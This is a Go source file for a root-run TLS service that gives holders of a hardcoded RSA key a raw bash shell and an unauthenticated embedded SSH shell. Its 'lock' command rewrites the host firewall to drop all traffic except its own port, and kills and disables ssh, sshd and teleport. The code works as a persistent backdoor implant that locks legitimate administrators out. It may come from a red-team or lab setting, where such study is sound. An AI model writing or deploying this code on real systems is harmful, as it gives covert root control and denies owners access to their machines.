package main

import (
	"bufio"
	"crypto"
	"crypto/ecdsa"
	"crypto/elliptic"
	"crypto/rand"
	"crypto/rsa"
	"crypto/sha256"
	"crypto/tls"
	"crypto/x509"
	"crypto/x509/pkix"
	"encoding/hex"
	"flag"
	"fmt"
	"io"
	"math/big"
	"net"
	"os"
	"os/exec"
	"runtime"
	"strings"
	"time"
	"path/filepath"

	"github.com/creack/pty"
	"golang.org/x/crypto/ssh"
)

// --- CONFIGURATION & LOGGING ---

var encodedPubKey = "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQCzvPNour52StYdBM6Ou8QJhvwqHQwLhkQHMcKTkKs8XkiTuflUlT4jooSHRMZKsYLM6coaczYPAbMLmNU8giEqirxQX7D5+ynxG4Lxpq2R2GXFFqqXY5Za0uBQov/P5jL922FlVLK36sx8xZeCY2HXG3BIynpRdKr1hMBKoaesG4dSEllQFePoVU+gJ11QEYeSDdxtXefw+jUMJkT9wrjHoJzwMhUMt5JC147hNMBZsXIxiUsAVWoGsTSWTSXe7tkTgtyndGKcOJ7rmveD30EZKx3p8OCypiiOnKlpX49VZi2JqAj0D7qxT2zvEOIgiRwg/4HTzPveJygVPaDqNXFglA7myOpqub6SG1cJK9NFirbbkmP+Z9ZgaCQ+mxSfytVO6rRve7WjpGo6doez7U1d22/+XonjZZz3v/C9BuJagjKO9pml0QukhUypz5/4SN6KB8QRvMkxIfpu7wnJ3jM11jd6yNtmpV9KyRyp3fZP1OyLK4dw3xzb9sHFMZjwbs0NPtb8EjV8QokHeIN1PK5KxDrrFRK6a64y9MEOvOnSTgXtoQi3aYdAyM7z92DkYo4pbGTaMe8fiEaOYilzq5Fyuo1bFs0vGP4qkflqYUTckukQGFoTra6SYA6v5fcNJgVuAOMn4ne328lGz8Fn0pSc/7IIA+y0TkaMAdKEnMHKSQ== ubuntu@jumphost" // <<<MARKING>>>

var (
	activePort string
	logTarget  string // "stdout", "file", or "both"
	logFile    string
)

func logEvent(msg string) {
	timestamp := time.Now().Format("2006-01-02 15:04:05")
	formatted := fmt.Sprintf("[%s] %s\n", timestamp, msg)

	if logTarget == "stdout" || logTarget == "both" {
		fmt.Fprint(os.Stdout, formatted)
	}

	if logTarget == "file" || logTarget == "both" {
		f, err := os.OpenFile(logFile, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
		if err == nil {
			defer f.Close()
			f.WriteString(formatted)
		} else {
			fmt.Fprintf(os.Stdout, "[%s] CRITICAL: Failed to write to log file: %v\n", timestamp, err)
		}
	}
}

type FirewallType string

const (
	UFW       FirewallType = "ufw"
	Firewalld FirewallType = "firewalld"
	Iptables  FirewallType = "iptables"
	Nftables  FirewallType = "nftables"
	Unknown   FirewallType = "unknown"
)

type bufioConn struct {
	net.Conn
	r *bufio.Reader
}

func (c *bufioConn) Read(b []byte) (int, error) {
	return c.r.Read(b)
}

type nopCloserConn struct {
	net.Conn
}

func (n *nopCloserConn) Close() error {
	return nil
}

type CommandHandler func(bc *bufioConn, args []string)

var CommandRegistry = make(map[string]CommandHandler)

func init() {
	CommandRegistry["help"] = handleHelp
	CommandRegistry["ping"] = handlePing
	CommandRegistry["info"] = handleInfo
	CommandRegistry["lock"] = handleLock
	CommandRegistry["unlock"] = handleUnlock
	CommandRegistry["shellraw"] = handleShellRaw
	CommandRegistry["shell"] = handleShell
	CommandRegistry["conntrackinstall"] = handleConntrackInstall
}

func main() {
	pFlag := flag.String("p", "9090", "Port to listen on")
	lTarget := flag.String("log-to", "stdout", "Where to send logs: stdout, file, or both")
	lFile := flag.String("log-file", "service.log", "Path to log file if log-to is file or both")
	flag.Parse()

	activePort = *pFlag
	logTarget = *lTarget
	logFile = *lFile

	if !HasRootAccess() {
		logEvent("ERROR: Not running as root. Firewall commands will fail.")
		os.Exit(1)
	}

	cert, err := generateInMemCert()
	if err != nil {
		logEvent(fmt.Sprintf("ERROR: Cert generation failed: %v", err))
		os.Exit(1)
	}

	config := &tls.Config{Certificates: []tls.Certificate{cert}}
	address := ":" + activePort

	listener, err := tls.Listen("tcp", address, config)
	if err != nil {
		logEvent(fmt.Sprintf("ERROR: Listen failed on %s: %v", address, err))
		os.Exit(1)
	}
	defer listener.Close()

	logEvent(fmt.Sprintf("Server started on %s. Logging to %s", address, logTarget))

	for {
		conn, err := listener.Accept()
		if err != nil {
			logEvent(fmt.Sprintf("ERROR: Accept failed: %v", err))
			continue
		}
		go handleConnection(conn)
	}
}

func handleConnection(conn net.Conn) {
	remoteAddr := conn.RemoteAddr().String()
	defer conn.Close()

	if !authenticate(conn) {
		logEvent(fmt.Sprintf("AUTH FAILURE: Failed login attempt from %s", remoteAddr))
		return
	}

	logEvent(fmt.Sprintf("AUTH SUCCESS: User logged in from %s", remoteAddr))

	bc := &bufioConn{Conn: conn, r: bufio.NewReader(conn)}
	bc.Conn.Write([]byte("--- AUTHENTICATED SYSTEM READY ---\n"))

	for {
		bc.Conn.Write([]byte("> "))
		line, err := bc.r.ReadString('\n')
		if err != nil {
			if err != io.EOF {
				logEvent(fmt.Sprintf("ERROR: Connection error with %s: %v", remoteAddr, err))
			} else {
				logEvent(fmt.Sprintf("SESSION END: Disconnected from %s", remoteAddr))
			}
			return
		}

		line = strings.TrimSpace(line)
		if line == "" {
			continue
		}

		parts := strings.Split(line, " ")
		cmdName := strings.ToLower(parts[0])
		args := parts[1:]

		if handler, ok := CommandRegistry[cmdName]; ok {
			logEvent(fmt.Sprintf("COMMAND: %s executed '%s' with args %v", remoteAddr, cmdName, args))
			handler(bc, args)

			if cmdName == "shell" {
				logEvent(fmt.Sprintf("Closing connection for %s after shell exit", conn.RemoteAddr()))
				return
			}
			if cmdName == "shellraw" {
				logEvent(fmt.Sprintf("Raw session (%s) ended for %s", cmdName, remoteAddr))
			}
		} else {
			bc.Conn.Write([]byte("Unknown command. Type 'help' for options.\n"))
		}
	}
}

// --- HANDLERS ---

func handleHelp(bc *bufioConn, args []string) {
	bc.Conn.Write([]byte("Available Modules: "))
	for name := range CommandRegistry {
		bc.Conn.Write([]byte("_" + name + " "))
	}
	bc.Conn.Write([]byte("\n"))
}

func handlePing(bc *bufioConn, args []string) {
	bc.Conn.Write([]byte("PONG\n"))
}

func handleInfo(bc *bufioConn, args []string) {
	fw := detectFirewall()
	distro := getDistroName()
	conntrackStatus := "not installed"
	if _, err := exec.LookPath("conntrack"); err == nil {
		conntrackStatus = "installed"
	}
	msg := fmt.Sprintf(
		"OS: %s | Arch: %s | CPUs: %d | Distro: %s | Firewall: %s | conntrack: %s\n",
		runtime.GOOS, runtime.GOARCH, runtime.NumCPU(), distro, string(fw), conntrackStatus,
	)
	bc.Conn.Write([]byte(msg))
}

func getDistroName() string {
	data, err := os.ReadFile("/etc/os-release")
	if err != nil {
		return "unknown"
	}
	for _, line := range strings.Split(string(data), "\n") {
		if strings.HasPrefix(line, "PRETTY_NAME=") {
			name := strings.TrimPrefix(line, "PRETTY_NAME=")
			name = strings.Trim(name, `"`)
			return name
		}
	}
	return "unknown"
}

func handleShellRaw(bc *bufioConn, args []string) {
	var shell string
	if runtime.GOOS == "windows" {
		shell = "cmd.exe"
	} else {
		shell = "/bin/bash"
	}
	cmd := exec.Command(shell)
	cmd.Stdin, cmd.Stdout, cmd.Stderr = bc, bc.Conn, bc.Conn
	err := cmd.Run()
	if err != nil {
		logEvent(fmt.Sprintf("ERROR: ShellRaw failed: %v", err))
	}
}

func handleShell(bc *bufioConn, args []string) {
	hostKey, err := generateSSHHostKey()
	if err != nil {
		errMsg := fmt.Sprintf("ERROR: Host key generation failed: %v", err)
		logEvent(errMsg)
		bc.Conn.Write([]byte(errMsg + "\n"))
		return
	}

	sshConfig := &ssh.ServerConfig{
		NoClientAuth: true,
	}
	sshConfig.AddHostKey(hostKey)

	safeConn := &nopCloserConn{Conn: bc}
	sshConn, chans, reqs, err := ssh.NewServerConn(safeConn, sshConfig)
	if err != nil {
		logEvent(fmt.Sprintf("ERROR: SSH Handshake failed: %v", err))
		return
	}

	go ssh.DiscardRequests(reqs)

	for newChan := range chans {
		if newChan.ChannelType() != "session" {
			newChan.Reject(ssh.UnknownChannelType, "unsupported channel type")
			continue
		}

		channel, requests, err := newChan.Accept()
		if err != nil {
			logEvent(fmt.Sprintf("ERROR: Failed to accept SSH channel: %v", err))
			continue
		}

		handleSSHSession(channel, requests)
		break
	}

	sshConn.Close()
	bc.Conn.Write([]byte("\r\n[SSH Session Terminated]\r\n"))
}

func handleSSHSession(channel ssh.Channel, requests <-chan *ssh.Request) {
	done := make(chan bool)
	var ptmx *os.File
	var cmd *exec.Cmd

	go func() {
		for req := range requests {
			switch req.Type {
			case "pty-req":
				termLen := req.Payload[3]
				term := string(req.Payload[4 : 4+termLen])
				w := binary32(req.Payload[4+termLen:])
				h := binary32(req.Payload[4+termLen+4:])

				cmd = exec.Command("/bin/bash")
				cmd.Env = append(os.Environ(), "TERM="+term)

				var err error
				ptmx, err = pty.Start(cmd)
				if err != nil {
					logEvent(fmt.Sprintf("ERROR: PTY Start failed: %v", err))
					req.Reply(false, nil)
					return
				}

				pty.Setsize(ptmx, &pty.Winsize{Cols: uint16(w), Rows: uint16(h)})

				go func() {
					io.Copy(channel, ptmx)
					channel.SendRequest("exit-status", false, ssh.Marshal(struct{ Status uint32 }{0}))
					channel.Close()
					done <- true
				}()

				go func() {
					io.Copy(ptmx, channel)
				}()

				req.Reply(true, nil)

			case "shell":
				req.Reply(true, nil)
			case "window-change":
				if ptmx != nil {
					w := binary32(req.Payload[0:])
					h := binary32(req.Payload[4:])
					pty.Setsize(ptmx, &pty.Winsize{Cols: uint16(w), Rows: uint16(h)})
				}
			default:
				if req.WantReply {
					req.Reply(false, nil)
				}
			}
		}
	}()

	<-done
	if cmd != nil && cmd.Process != nil {
		cmd.Process.Kill()
	}
	if ptmx != nil {
		ptmx.Close()
	}
}

func handleLock(bc *bufioConn, args []string) {
	err := ApplyStrictFirewall(activePort, "/var/backups/firewall_rules.bak", bc)
	if err != nil {
		errMsg := fmt.Sprintf("ERROR: Firewall LOCKDOWN failed: %v", err)
		logEvent(errMsg)
		bc.Conn.Write([]byte(errMsg + "\n"))
	} else {
		logEvent("SUCCESS: Firewall LOCKDOWN applied.")
		bc.Conn.Write([]byte("[+] Lockdown successful.\n"))
	}
}

func handleUnlock(bc *bufioConn, args []string) {
	err := RestoreFirewall("/var/backups/firewall_rules.bak")
	if err != nil {
		errMsg := fmt.Sprintf("ERROR: Firewall UNLOCK failed: %v", err)
		logEvent(errMsg)
		bc.Conn.Write([]byte(errMsg + "\n"))
	} else {
		logEvent("SUCCESS: Firewall RESTORED.")
		bc.Conn.Write([]byte("[+] Firewall restored.\n"))
	}

	// Re-enable services that were disabled during lockdown
	for _, svc := range []string{"ssh", "sshd", "teleport"} {
		enableService(svc, bc)
	}
}

// handleConntrackInstall installs conntrack-tools if not already present.
func handleConntrackInstall(bc *bufioConn, args []string) {
	if _, err := exec.LookPath("conntrack"); err == nil {
		bc.Conn.Write([]byte("[+] conntrack is already installed.\n"))
		logEvent("CONNTRACK: already installed, nothing to do")
		return
	}

	type pmEntry struct {
		bin     string
		install []string
		pkg     string
	}

	// Ordered by prevalence; package-manager binary is the discriminator.
	candidates := []pmEntry{
		// Debian / Ubuntu / Mint / Kali / Raspbian
		{"apt-get", []string{"apt-get", "install", "-y", "--no-install-recommends"}, "conntrack"},
		// RHEL 8+ / Fedora / Rocky / Alma / CentOS Stream (dnf preferred)
		{"dnf", []string{"dnf", "install", "-y"}, "conntrack-tools"},
		// RHEL 7 / older CentOS (yum fallback)
		{"yum", []string{"yum", "install", "-y"}, "conntrack-tools"},
		// openSUSE / SLES
		{"zypper", []string{"zypper", "--non-interactive", "install"}, "conntrack-tools"},
		// Arch Linux / Manjaro
		{"pacman", []string{"pacman", "-S", "--noconfirm"}, "conntrack-tools"},
		// Alpine Linux
		{"apk", []string{"apk", "add", "--no-cache"}, "conntrack-tools"},
		// Void Linux
		{"xbps-install", []string{"xbps-install", "-y"}, "conntrack-tools"},
		// Gentoo
		{"emerge", []string{"emerge", "--ask=n"}, "net-firewall/conntrack-tools"},
	}

	var chosen *pmEntry
	for i := range candidates {
		if _, err := exec.LookPath(candidates[i].bin); err == nil {
			chosen = &candidates[i]
			break
		}
	}

	if chosen == nil {
		msg := "ERROR: No supported package manager found; cannot install conntrack automatically."
		logEvent("CONNTRACK: " + msg)
		bc.Conn.Write([]byte(msg + "\n"))
		return
	}

	logEvent(fmt.Sprintf("CONNTRACK: installing via %s", chosen.bin))
	bc.Conn.Write([]byte(fmt.Sprintf("[*] Installing conntrack via %s...\n", chosen.bin)))

	cmdArgs := append(chosen.install, chosen.pkg)
	cmd := exec.Command(cmdArgs[0], cmdArgs[1:]...)

	pr, pw, err := os.Pipe()
	if err != nil {
		bc.Conn.Write([]byte(fmt.Sprintf("ERROR: pipe creation failed: %v\n", err)))
		return
	}
	cmd.Stdout = pw
	cmd.Stderr = pw

	if err := cmd.Start(); err != nil {
		pw.Close()
		pr.Close()
		msg := fmt.Sprintf("ERROR: Failed to start %s: %v", chosen.bin, err)
		logEvent("CONNTRACK: " + msg)
		bc.Conn.Write([]byte(msg + "\n"))
		return
	}

	copyDone := make(chan struct{})
	go func() {
		defer close(copyDone)
		buf := make([]byte, 4096)
		for {
			n, err := pr.Read(buf)
			if n > 0 {
				bc.Conn.Write(buf[:n])
			}
			if err != nil {
				break
			}
		}
	}()

	installErr := cmd.Wait()
	pw.Close()
	<-copyDone
	pr.Close()

	if installErr != nil {
		msg := fmt.Sprintf("ERROR: Installation failed (exit: %v)", installErr)
		logEvent("CONNTRACK: " + msg)
		bc.Conn.Write([]byte(msg + "\n"))
		return
	}

	if _, err := exec.LookPath("conntrack"); err != nil {
		msg := "WARN: Package installed but 'conntrack' binary not found in PATH."
		logEvent("CONNTRACK: " + msg)
		bc.Conn.Write([]byte(msg + "\n"))
		return
	}

	logEvent(fmt.Sprintf("CONNTRACK: successfully installed via %s", chosen.bin))
	bc.Conn.Write([]byte("[+] conntrack installed successfully.\n"))
}

// ip6tablesAvailable returns true if the ip6tables binary is present on this host.
func ip6tablesAvailable() bool {
	_, err := exec.LookPath("ip6tables")
	return err == nil
}

// runIP6Tables mirrors a set of iptables arguments against ip6tables.
// Errors are logged as warnings but are non-fatal so that hosts without
// IPv6 or ip6tables support still apply the IPv4 rules successfully.
func runIP6Tables(bc *bufioConn, args ...string) {
	if !ip6tablesAvailable() {
		return
	}
	if err := exec.Command("ip6tables", args...).Run(); err != nil {
		msg := fmt.Sprintf("WARN: ip6tables %v failed: %v", args, err)
		logEvent(msg)
		bc.Conn.Write([]byte(msg + "\n"))
	}
}

func ApplyStrictFirewall(port string, backupPath string, bc *bufioConn) error {
	if err := backupFirewall(backupPath); err != nil {
		return fmt.Errorf("backup failed: %w", err)
	}

	fw := detectFirewall()
	switch fw {
	case UFW:
		// Ensure UFW is configured to manage IPv6 before reset/enable.
		ensureUFWIPv6(bc)
		exec.Command("ufw", "--force", "reset").Run()
		exec.Command("ufw", "default", "deny", "incoming").Run()
		exec.Command("ufw", "default", "deny", "outgoing").Run()
		exec.Command("ufw", "allow", port+"/tcp").Run()
		if err := exec.Command("ufw", "--force", "enable").Run(); err != nil {
			return err
		}

	case Firewalld:
		// firewalld is dual-stack by default; applying rules to the drop zone
		// covers both IPv4 and IPv6 without extra steps.
		exec.Command("firewall-cmd", "--set-default-zone=drop").Run()

		zones, _ := exec.Command("firewall-cmd", "--get-active-zones").Output()
		for _, line := range strings.Split(string(zones), "\n") {
			fields := strings.Fields(line)
			if len(fields) > 1 {
				zone := fields[0]
				for _, iface := range fields[1:] {
					exec.Command("firewall-cmd", "--zone="+zone, "--remove-interface="+iface, "--permanent").Run()
					exec.Command("firewall-cmd", "--zone=drop", "--add-interface="+iface, "--permanent").Run()
				}
			}
		}
		if err := exec.Command("firewall-cmd", "--zone=drop", "--add-port="+port+"/tcp", "--permanent").Run(); err != nil {
			return err
		}
		if err := exec.Command("firewall-cmd", "--reload").Run(); err != nil {
			return err
		}

	case Iptables:
		// --- IPv4 ---
		exec.Command("iptables", "-F").Run()
		exec.Command("iptables", "-P", "INPUT", "DROP").Run()
		exec.Command("iptables", "-P", "OUTPUT", "DROP").Run()
		exec.Command("iptables", "-A", "INPUT", "-p", "tcp", "--dport", port, "-j", "ACCEPT").Run()
		exec.Command("iptables", "-A", "OUTPUT", "-p", "tcp", "--sport", port, "-j", "ACCEPT").Run()
		exec.Command("iptables", "-A", "INPUT", "-i", "lo", "-j", "ACCEPT").Run()
		exec.Command("iptables", "-A", "OUTPUT", "-o", "lo", "-j", "ACCEPT").Run()
		// --- IPv6 mirror ---
		runIP6Tables(bc, "-F")
		runIP6Tables(bc, "-P", "INPUT", "DROP")
		runIP6Tables(bc, "-P", "OUTPUT", "DROP")
		runIP6Tables(bc, "-A", "INPUT", "-p", "tcp", "--dport", port, "-j", "ACCEPT")
		runIP6Tables(bc, "-A", "OUTPUT", "-p", "tcp", "--sport", port, "-j", "ACCEPT")
		runIP6Tables(bc, "-A", "INPUT", "-i", "lo", "-j", "ACCEPT")
		runIP6Tables(bc, "-A", "OUTPUT", "-o", "lo", "-j", "ACCEPT")

	case Nftables:
		// The table family "inet" already covers both IPv4 and IPv6 — no change needed.
		exec.Command("nft", "flush", "ruleset").Run()
		nftScript := fmt.Sprintf(`
table inet filter {
    chain input {
        type filter hook input priority 0; policy drop;
        iif "lo" accept
        tcp dport %s accept
    }
    chain output {
        type filter hook output priority 0; policy drop;
        oif "lo" accept
        tcp sport %s accept
    }
    chain forward {
        type filter hook forward priority 0; policy drop;
    }
}
`, port, port)
		cmd := exec.Command("nft", "-f", "-")
		cmd.Stdin = strings.NewReader(nftScript)
		if err := cmd.Run(); err != nil {
			return fmt.Errorf("nftables apply failed: %w", err)
		}

	case Unknown:
		return fmt.Errorf("no supported firewall detected")
	}

	for _, svc := range []string{"ssh", "sshd", "teleport"} {
		disableService(svc, bc)
	}

	if err := flushConntrack(); err != nil {
		wmsg := fmt.Sprintf("WARN: %v", err)
		logEvent(wmsg)
		bc.Conn.Write([]byte(wmsg + "\n"))
	}

	return nil
}

// ensureUFWIPv6 sets IPV6=yes in /etc/default/ufw so that UFW manages ip6tables
// in addition to iptables. If the file cannot be read or written the error is
// logged as a warning and the caller continues (UFW itself will still apply IPv4 rules).
func ensureUFWIPv6(bc *bufioConn) {
	const path = "/etc/default/ufw"
	data, err := os.ReadFile(path)
	if err != nil {
		msg := fmt.Sprintf("WARN: could not read %s to enforce IPv6: %v", path, err)
		logEvent(msg)
		bc.Conn.Write([]byte(msg + "\n"))
		return
	}

	updated := false
	lines := strings.Split(string(data), "\n")
	for i, line := range lines {
		trimmed := strings.TrimSpace(line)
		// Replace both IPV6=no and commented-out # IPV6=... with IPV6=yes
		if strings.HasPrefix(trimmed, "IPV6=") || (strings.HasPrefix(trimmed, "#") && strings.Contains(trimmed, "IPV6=")) {
			lines[i] = "IPV6=yes"
			updated = true
		}
	}

	// If the directive was absent entirely, append it.
	if !updated {
		lines = append(lines, "IPV6=yes")
	}

	if err := os.WriteFile(path, []byte(strings.Join(lines, "\n")), 0644); err != nil {
		msg := fmt.Sprintf("WARN: could not write %s to enforce IPv6: %v", path, err)
		logEvent(msg)
		bc.Conn.Write([]byte(msg + "\n"))
		return
	}

	logEvent("LOCKDOWN: /etc/default/ufw — IPV6=yes ensured")
}

func flushConntrack() error {
	if path, err := exec.LookPath("conntrack"); err == nil {
		_ = path
		if err := exec.Command("conntrack", "-F").Run(); err != nil {
			return fmt.Errorf("conntrack flush failed: %w", err)
		}
		logEvent("LOCKDOWN: conntrack table flushed — all existing sessions invalidated")
		return nil
	}
	logEvent("WARN: conntrack binary not found — existing sessions may persist through firewalld")
	return fmt.Errorf("conntrack tool not available; run \nsudo dnf install conntrack-tools\nsudo apt install conntrack -y\nsudo zypper install conntrack-tools")
}

func RestoreFirewall(backupPath string) error {
	fw := detectFirewall()
	switch fw {
	case UFW:
		exec.Command("ufw", "--force", "disable").Run()
		exec.Command("ufw", "--force", "reset").Run()
		// IPv4
		exec.Command("iptables", "-F").Run()
		exec.Command("iptables", "-X").Run()
		exec.Command("iptables", "-P", "INPUT", "ACCEPT").Run()
		exec.Command("iptables", "-P", "OUTPUT", "ACCEPT").Run()
		exec.Command("iptables", "-P", "FORWARD", "ACCEPT").Run()
		// IPv6
		if ip6tablesAvailable() {
			exec.Command("ip6tables", "-F").Run()
			exec.Command("ip6tables", "-X").Run()
			exec.Command("ip6tables", "-P", "INPUT", "ACCEPT").Run()
			exec.Command("ip6tables", "-P", "OUTPUT", "ACCEPT").Run()
			exec.Command("ip6tables", "-P", "FORWARD", "ACCEPT").Run()
		}

	case Firewalld:
		// Restore to trusted zone (dual-stack — covers IPv4 and IPv6).
		exec.Command("firewall-cmd", "--set-default-zone=trusted").Run()
		exec.Command("firewall-cmd", "--reload").Run()

	case Iptables:
		// IPv4
		exec.Command("iptables", "-F").Run()
		exec.Command("iptables", "-X").Run()
		exec.Command("iptables", "-P", "INPUT", "ACCEPT").Run()
		exec.Command("iptables", "-P", "OUTPUT", "ACCEPT").Run()
		exec.Command("iptables", "-P", "FORWARD", "ACCEPT").Run()
		// IPv6
		if ip6tablesAvailable() {
			exec.Command("ip6tables", "-F").Run()
			exec.Command("ip6tables", "-X").Run()
			exec.Command("ip6tables", "-P", "INPUT", "ACCEPT").Run()
			exec.Command("ip6tables", "-P", "OUTPUT", "ACCEPT").Run()
			exec.Command("ip6tables", "-P", "FORWARD", "ACCEPT").Run()
		}

	case Nftables:
		// Flushing the entire ruleset leaves nftables in allow-all for both
		// IPv4 and IPv6 (inet tables cover both families).
		exec.Command("nft", "flush", "ruleset").Run()

	default:
		return fmt.Errorf("no supported firewall detected for unlock")
	}
	return nil
}

func detectFirewall() FirewallType {
	if exec.Command("systemctl", "is-active", "--quiet", "ufw").Run() == nil {
		return UFW
	}
	if exec.Command("systemctl", "is-active", "--quiet", "firewalld").Run() == nil {
		return Firewalld
	}
	if exec.Command("systemctl", "is-active", "--quiet", "nftables").Run() == nil {
		return Nftables
	}
	if _, err := exec.LookPath("iptables"); err == nil {
		return Iptables
	}
	return Unknown
}

func backupFirewall(backupPath string) error {
	fw := detectFirewall()

	switch fw {
	case Firewalld:
		src := "/etc/firewalld"
		dst := filepath.Join(backupPath, "firewalld")

		if _, err := os.Stat(dst); err == nil {
			logEvent(fmt.Sprintf("BACKUP: %s already exists, skipping overwrite", dst))
			return nil
		}

		return copyDir(src, dst)

	case UFW, Iptables, Nftables:
		var out []byte
		var err error
		var prefix string

		switch fw {
		case UFW, Iptables:
			out, err = exec.Command("iptables-save").Output()
			prefix = string(fw) + "\n"
		case Nftables:
			out, err = exec.Command("nft", "list", "ruleset").Output()
			prefix = "nftables\n"
		}

		if err != nil {
			return err
		}

		dir := filepath.Dir(backupPath)
		if err := os.MkdirAll(dir, 0700); err != nil {
			return err
		}

		if _, err := os.Stat(backupPath); err == nil {
			logEvent(fmt.Sprintf("BACKUP: %s already exists, skipping overwrite", backupPath))
			return nil
		}

		f, err := os.OpenFile(backupPath, os.O_CREATE|os.O_WRONLY|os.O_EXCL, 0600)
		if err != nil {
			return err
		}
		defer f.Close()

		_, err = f.Write(append([]byte(prefix), out...))
		return err
	}

	return fmt.Errorf("cannot backup: unknown firewall")
}

func copyDir(src, dst string) error {
	return filepath.Walk(src, func(path string, info os.FileInfo, err error) error {
		if err != nil {
			return err
		}

		rel, err := filepath.Rel(src, path)
		if err != nil {
			return err
		}

		target := filepath.Join(dst, rel)

		if info.IsDir() {
			return os.MkdirAll(target, info.Mode())
		}

		in, err := os.Open(path)
		if err != nil {
			return err
		}
		defer in.Close()

		out, err := os.OpenFile(target, os.O_CREATE|os.O_WRONLY|os.O_TRUNC, info.Mode())
		if err != nil {
			return err
		}
		defer out.Close()

		_, err = io.Copy(out, in)
		return err
	})
}

func disableService(name string, bc *bufioConn) {
	if err := exec.Command("systemctl", "cat", name).Run(); err != nil {
		return
	}

	if err := exec.Command("systemctl", "kill", "--kill-who=all", "--signal=SIGKILL", name).Run(); err != nil {
		msg := fmt.Sprintf("WARN: kill %s failed: %v", name, err)
		logEvent(msg)
		bc.Conn.Write([]byte(msg + "\n"))
	}

	if err := exec.Command("systemctl", "stop", name).Run(); err != nil {
		msg := fmt.Sprintf("WARN: stop %s failed: %v", name, err)
		logEvent(msg)
		bc.Conn.Write([]byte(msg + "\n"))
	}

	if err := exec.Command("systemctl", "disable", name).Run(); err != nil {
		msg := fmt.Sprintf("WARN: disable %s failed: %v", name, err)
		logEvent(msg)
		bc.Conn.Write([]byte(msg + "\n"))
	}

	logEvent(fmt.Sprintf("LOCKDOWN: %s killed, stopped, and disabled", name))
	bc.Conn.Write([]byte(fmt.Sprintf("[+] %s killed, stopped, and disabled.\n", name)))
}

func enableService(name string, bc *bufioConn) {
	if err := exec.Command("systemctl", "cat", name).Run(); err != nil {
		return
	}

	if err := exec.Command("systemctl", "enable", name).Run(); err != nil {
		msg := fmt.Sprintf("WARN: enable %s failed: %v", name, err)
		logEvent(msg)
		bc.Conn.Write([]byte(msg + "\n"))
	}

	if err := exec.Command("systemctl", "start", name).Run(); err != nil {
		msg := fmt.Sprintf("WARN: start %s failed: %v", name, err)
		logEvent(msg)
		bc.Conn.Write([]byte(msg + "\n"))
	}

	logEvent(fmt.Sprintf("UNLOCK: %s enabled and started", name))
	bc.Conn.Write([]byte(fmt.Sprintf("[+] %s enabled and started.\n", name)))
}

func authenticate(conn net.Conn) bool {
	challenge := make([]byte, 32)
	rand.Read(challenge)
	conn.Write([]byte(hex.EncodeToString(challenge) + "\n"))

	reader := bufio.NewReader(conn)
	sigHex, err := reader.ReadString('\n')
	if err != nil {
		logEvent(fmt.Sprintf("AUTH ERROR: Failed to read signature: %v", err))
		return false
	}

	signature, err := hex.DecodeString(strings.TrimSpace(sigHex))
	if err != nil {
		logEvent(fmt.Sprintf("AUTH ERROR: Invalid hex signature: %v", err))
		return false
	}

	return verifySignature(challenge, signature)
}

func verifySignature(message, signature []byte) bool {
	pub, _, _, _, err := ssh.ParseAuthorizedKey([]byte(encodedPubKey))
	if err != nil {
		logEvent(fmt.Sprintf("AUTH ERROR: Could not parse encodedPubKey: %v", err))
		return false
	}
	cryptoPub, ok := pub.(ssh.CryptoPublicKey)
	if !ok {
		return false
	}
	rsaPub, ok := cryptoPub.CryptoPublicKey().(*rsa.PublicKey)
	if !ok {
		return false
	}
	hash := sha256.Sum256(message)
	err = rsa.VerifyPKCS1v15(rsaPub, crypto.SHA256, hash[:], signature)
	if err != nil {
		logEvent(fmt.Sprintf("AUTH ERROR: Signature verification failed: %v", err))
		return false
	}
	return true
}

func generateInMemCert() (tls.Certificate, error) {
	priv, _ := ecdsa.GenerateKey(elliptic.P256(), rand.Reader)
	template := x509.Certificate{
		SerialNumber: big.NewInt(1),
		Subject:      pkix.Name{Organization: []string{"Internal"}},
		NotBefore:    time.Now(),
		NotAfter:     time.Now().Add(time.Hour * 500),
		KeyUsage:     x509.KeyUsageKeyEncipherment | x509.KeyUsageDigitalSignature,
		ExtKeyUsage:  []x509.ExtKeyUsage{x509.ExtKeyUsageServerAuth},
	}
	derBytes, err := x509.CreateCertificate(rand.Reader, &template, &template, &priv.PublicKey, priv)
	if err != nil {
		return tls.Certificate{}, err
	}
	return tls.Certificate{Certificate: [][]byte{derBytes}, PrivateKey: priv}, nil
}

func binary32(b []byte) uint32 {
	if len(b) < 4 {
		return 0
	}
	return uint32(b[0])<<24 | uint32(b[1])<<16 | uint32(b[2])<<8 | uint32(b[3])
}

func generateSSHHostKey() (ssh.Signer, error) {
	key, err := rsa.GenerateKey(rand.Reader, 2048)
	if err != nil {
		return nil, err
	}
	return ssh.NewSignerFromKey(key)
}

func HasRootAccess() bool {
	return os.Geteuid() == 0
}